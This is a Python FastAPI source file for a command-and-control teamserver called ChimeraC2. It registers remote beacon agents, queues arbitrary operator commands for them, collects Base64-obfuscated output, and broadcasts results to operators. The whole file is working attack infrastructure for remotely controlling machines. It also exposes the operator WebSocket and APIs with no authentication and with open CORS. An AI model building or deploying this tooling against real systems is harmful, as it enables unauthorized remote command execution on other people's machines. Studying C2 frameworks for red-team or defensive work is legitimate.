import asyncio
import base64
import datetime
import logging
import traceback
import uuid
from typing import Any, Dict, List, Optional

logger = logging.getLogger("chimera.teamserver")

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware

from .db import (
    add_audit_log,
    complete_task,
    create_task,
    get_agent,
    get_all_agents,
    get_audit_logs,
    get_connection,
    get_pending_tasks,
    get_tasks_for_agent,
    init_db,
    mark_task_running,
    upsert_agent,
)
from .models import (
    AgentRegisterSchema,
    PollRequestSchema,
    TaskDispatchSchema,
    TaskResultSchema,
)

app = FastAPI(
    title="ChimeraC2 Teamserver",
    version="1.0.0",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/health")
def health() -> Dict[str, str]:
    """Health check endpoint confirming teamserver responsiveness."""
    return {"status": "ok"}


# ============================================================
# Configuration & In-Memory Real-Time State
# ============================================================

AGENT_TIMEOUT = 15

# Real-time state dictionaries
connected_agents: Dict[str, Dict[str, Any]] = {}
task_queues: Dict[str, List[Dict[str, Any]]] = {}
active_operators: List[WebSocket] = []


def utc_now() -> str:
    """Return the current UTC timestamp formatted as ISO 8601 string."""
    return datetime.datetime.now(datetime.timezone.utc).isoformat()


# ============================================================
# WebSocket Connection Manager
# ============================================================

class ConnectionManager:
    """Manages real-time WebSocket subscriber sessions for operators."""

    async def connect(self, websocket: WebSocket) -> None:
        await websocket.accept()
        if websocket not in active_operators:
            active_operators.append(websocket)

    def disconnect(self, websocket: WebSocket) -> None:
        if websocket in active_operators:
            active_operators.remove(websocket)

    async def broadcast(self, message: Dict[str, Any]) -> None:
        for connection in active_operators.copy():
            try:
                await connection.send_json(message)
            except Exception:
                self.disconnect(connection)


manager = ConnectionManager()


# ============================================================
# Startup & Rehydration
# ============================================================

def rehydrate_state() -> None:
    """
    Rehydrate in-memory state from SQLite upon server boot.
    Restores connected_agents fleet records and pending task queues
    so that server restarts are transparent to connected agents.
    """
    persisted_agents = get_all_agents()
    for agent in persisted_agents:
        agent_id = agent["agent_id"]
        # Mark rehydrated nodes as offline until their next beacon poll
        agent["status"] = "offline"
        connected_agents[agent_id] = agent
        if agent_id not in task_queues:
            task_queues[agent_id] = []

    pending_tasks = get_pending_tasks()
    restored_task_count = 0
    for task in pending_tasks:
        agent_id = task["agent_id"]
        if agent_id in task_queues:
            task_queues[agent_id].append({
                "task_id": task["task_id"],
                "command": task["command"],
            })
            restored_task_count += 1

    print(
        f"[*] Rehydration complete: {len(persisted_agents)} agent(s) and "
        f"{restored_task_count} pending task(s) loaded into memory."
    )


@app.on_event("startup")
async def startup_event() -> None:
    """Initialize database tables, rehydrate persistent state, and start monitor task."""
    init_db()
    rehydrate_state()
    asyncio.create_task(monitor_agents())


# ============================================================
# Agent Registration (Pydantic Validated)
# ============================================================

@app.post("/api/v1/beacon/register")
async def register_agent(payload: AgentRegisterSchema) -> Dict[str, Any]:
    """
    Register a new or returning agent node.
    Strictly validated via AgentRegisterSchema; missing required fields
    automatically trigger HTTP 422 Unprocessable Entity.
    """
    try:
        agent_data = payload.model_dump()
        agent_id = agent_data["agent_id"]
        now = utc_now()

        agent_data["last_seen"] = now
        agent_data["status"] = "online"

        # Update in-memory state
        connected_agents[agent_id] = agent_data
        if agent_id not in task_queues:
            task_queues[agent_id] = []

        # Persist to SQLite with full telemetry
        upsert_agent(agent_data)

        # Record registration audit log
        add_audit_log(
            event_type="AGENT_REGISTERED",
            agent_id=agent_id,
            message=f"Agent {agent_id} ({agent_data.get('hostname')}) registered",
        )

        # Broadcast event to connected operators
        await manager.broadcast({
            "type": "AGENT_REGISTER",
            "agent": agent_data,
        })

        return {
            "status": "registered",
            "agent_id": agent_id,
        }
    except Exception as exc:
        logger.error("register_agent failed: %s\n%s", exc, traceback.format_exc())
        return {"status": "error", "detail": str(exc)}


# ============================================================
# Agent Poll / Heartbeat (Pydantic Validated)
# ============================================================

@app.post("/api/v1/beacon/poll")
async def poll_tasks(payload: PollRequestSchema) -> Dict[str, Any]:
    """
    Process beacon polling and heartbeat check-in from agents.
    Strictly validated via PollRequestSchema.
    Returns queued command or empty task object.
    """
    try:
        agent_id = payload.agent_id

        # If unrecognized in memory, attempt fallback to SQLite persistence
        if agent_id not in connected_agents:
            persisted = get_agent(agent_id)
            if persisted:
                connected_agents[agent_id] = persisted
                if agent_id not in task_queues:
                    task_queues[agent_id] = []
            else:
                return {
                    "task": None,
                    "error": "unknown agent_id",
                }

        now = utc_now()
        agent = connected_agents[agent_id]
        previous_status = agent.get("status", "offline")

        agent["last_seen"] = now
        agent["status"] = "online"

        # Persist heartbeat check-in
        upsert_agent(agent)

        await manager.broadcast({
            "type": "AGENT_HEARTBEAT",
            "agent_id": agent_id,
            "ts": now,
            "status": "online",
        })

        # Transition to online audit and notification
        if previous_status == "offline":
            add_audit_log(
                event_type="AGENT_ONLINE",
                agent_id=agent_id,
                message=f"Agent {agent_id} came back online",
            )
            await manager.broadcast({
                "type": "AGENT_REGISTER",
                "agent": agent,
            })

        # Deliver queued task if available
        if task_queues.get(agent_id):
            task = task_queues[agent_id].pop(0)
            mark_task_running(task["task_id"])

            add_audit_log(
                event_type="TASK_RUNNING",
                agent_id=agent_id,
                task_id=task["task_id"],
                message=f"Task {task['task_id']} started running",
            )

            return {
                "task": task,
            }

        return {
            "task": None,
        }
    except Exception as exc:
        logger.error("poll_tasks failed: %s\n%s", exc, traceback.format_exc())
        return {"task": None, "error": str(exc)}


# ============================================================
# Task Result (Pydantic Validated)
# ============================================================

@app.post("/api/v1/beacon/result")
async def receive_result(payload: TaskResultSchema) -> Dict[str, Any]:
    """
    Receive and persist command execution output from agents.
    Strictly validated via TaskResultSchema; decodes Base64 obfuscated output.
    """
    try:
        result_data = payload.model_dump()
        agent_id = result_data["agent_id"]
        task_id = result_data["task_id"]
        output = result_data.get("output", "")
        exit_code = result_data.get("exit_code", -1)

        # Decode Base64 obfuscation when applicable with safe UTF-8 fallback.
        # Using errors='replace' ensures non-UTF-8 binary bytes render as
        # U+FFFD replacement characters rather than raising a decode error.
        try:
            decoded_output = base64.b64decode(output, validate=True).decode(
                "utf-8", errors="replace"
            )
        except Exception:
            decoded_output = output

        # Replace raw output with decoded plaintext for the broadcast payload
        result_data["output"] = decoded_output
        result_data["decoded_output"] = decoded_output

        # Persist completion in database
        if task_id:
            complete_task(
                task_id=task_id,
                output=decoded_output,
                exit_code=exit_code,
            )

            event_type = "TASK_COMPLETED" if exit_code == 0 else "TASK_FAILED"
            add_audit_log(
                event_type=event_type,
                agent_id=agent_id,
                task_id=task_id,
                message=f"Task {task_id} finished with exit code {exit_code}",
            )

        # Keep agent marked online
        if agent_id in connected_agents:
            now = utc_now()
            connected_agents[agent_id]["last_seen"] = now
            connected_agents[agent_id]["status"] = "online"
            upsert_agent(connected_agents[agent_id])

        # Broadcast task result to dashboard operators
        await manager.broadcast({
            "type": "TASK_RESULT",
            "result": result_data,
        })

        return {
            "status": "accepted",
        }
    except Exception as exc:
        logger.error("receive_result failed: %s\n%s", exc, traceback.format_exc())
        return {"status": "error", "detail": str(exc)}


# ============================================================
# Task History REST API
# ============================================================

@app.get("/api/v1/tasks")
async def get_task_history(
    agent_id: Optional[str] = None,
) -> Dict[str, Any]:
    """Fetch task history optionally filtered by agent_id."""
    try:
        if agent_id:
            tasks = get_tasks_for_agent(agent_id)
        else:
            conn = get_connection()
            rows = conn.execute(
                """
                SELECT *
                FROM tasks
                ORDER BY created_at DESC
                """
            ).fetchall()
            conn.close()
            tasks = [dict(row) for row in rows]

        return {
            "count": len(tasks),
            "tasks": tasks,
        }
    except Exception as exc:
        logger.error("get_task_history failed: %s\n%s", exc, traceback.format_exc())
        return {"count": 0, "tasks": [], "error": str(exc)}


# ============================================================
# Audit History REST API
# ============================================================

@app.get("/api/v1/audit")
async def audit_history(
    agent_id: Optional[str] = None,
    task_id: Optional[str] = None,
    limit: int = 100,
) -> Dict[str, Any]:
    """Fetch recent audit events with bounded pagination."""
    try:
        bounded_limit = max(1, min(limit, 500))
        logs = get_audit_logs(
            agent_id=agent_id,
            task_id=task_id,
            limit=bounded_limit,
        )
        return {
            "count": len(logs),
            "logs": logs,
        }
    except Exception as exc:
        logger.error("audit_history failed: %s\n%s", exc, traceback.format_exc())
        return {"count": 0, "logs": [], "error": str(exc)}


# ============================================================
# Agent Inactivity Background Monitor
# ============================================================

async def monitor_agents() -> None:
    """Background task checking agent check-in recency and broadcasting disconnects."""
    while True:
        await asyncio.sleep(5)
        now = datetime.datetime.now(datetime.timezone.utc)

        for agent_id, agent in connected_agents.items():
            last_seen_string = agent.get("last_seen")
            if not last_seen_string:
                continue

            try:
                last_seen = datetime.datetime.fromisoformat(last_seen_string)
                if last_seen.tzinfo is None:
                    last_seen = last_seen.replace(tzinfo=datetime.timezone.utc)
                age = (now - last_seen).total_seconds()
            except Exception:
                continue

            if age > AGENT_TIMEOUT and agent.get("status") != "offline":
                agent["status"] = "offline"
                add_audit_log(
                    event_type="AGENT_OFFLINE",
                    agent_id=agent_id,
                    message=f"Agent {agent_id} went offline",
                )
                await manager.broadcast({
                    "type": "AGENT_DISCONNECT",
                    "agent_id": agent_id,
                    "ts": utc_now(),
                    "status": "offline",
                })


# ============================================================
# Operator WebSocket Dispatcher
# ============================================================

@app.websocket("/ws/operator")
async def operator_websocket(websocket: WebSocket) -> None:
    """WebSocket endpoint connecting Mission Control operator interfaces."""
    await manager.connect(websocket)

    try:
        # Initial fleet hydration: send all known agents
        for agent in connected_agents.values():
            await websocket.send_json({
                "type": "AGENT_REGISTER",
                "agent": agent,
            })

        while True:
            data = await websocket.receive_json()
            if data.get("action") != "exec":
                continue

            target_agent = data.get("agent_id")
            command = data.get("command")

            if not target_agent or not command:
                await websocket.send_json({
                    "type": "ERROR",
                    "message": "agent_id and command are required",
                })
                continue

            if target_agent not in task_queues:
                # If agent is in connected_agents but not task_queues, initialize queue
                if target_agent in connected_agents:
                    task_queues[target_agent] = []
                else:
                    await websocket.send_json({
                        "type": "ERROR",
                        "message": "Unknown agent_id",
                        "agent_id": target_agent,
                    })
                    continue

            task_id = f"task-{uuid.uuid4().hex[:6]}"
            new_task = {
                "task_id": task_id,
                "command": command,
            }

            create_task(
                task_id=task_id,
                agent_id=target_agent,
                command=command,
            )

            add_audit_log(
                event_type="TASK_CREATED",
                agent_id=target_agent,
                task_id=task_id,
                message=f"Task {task_id} created for agent {target_agent}",
            )

            task_queues[target_agent].append(new_task)

            await manager.broadcast({
                "type": "TASK_QUEUED",
                "task_id": task_id,
                "agent_id": target_agent,
                "command": command,
            })

    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)
